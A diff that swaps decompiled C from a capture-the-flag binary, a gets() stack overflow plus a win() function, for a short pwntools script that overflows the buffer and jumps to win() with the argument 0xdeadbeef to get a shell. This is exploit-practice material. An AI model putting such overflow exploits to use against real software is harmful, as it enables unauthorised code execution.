@@ -1,19 +1,15 @@
-void vuln(void)
-{
-  char local_3e [54];
-  
-  __x86.get_pc_thunk.ax();
-  gets(local_3e);
-  return;
-}
+from pwn import *
 
-void win(int param_1)
-{
-  int iVar1;
-  
-  iVar1 = __x86.get_pc_thunk.ax();
-  if (param_1 == -0x21524111) {
-    system((char *)(iVar1 + 0x12e));
-  }
-  return;
-}
+binary = context.binary = ELF('./chall_10')
+
+p = process('./chall_10')
+p.recv()
+
+payload  = b''
+payload += 0x3e * b'A'
+payload += p32(binary.sym.win)
+payload += p32(0)
+payload += p32(0xdeadbeef)
+
+p.sendline(payload)
+p.interactive()
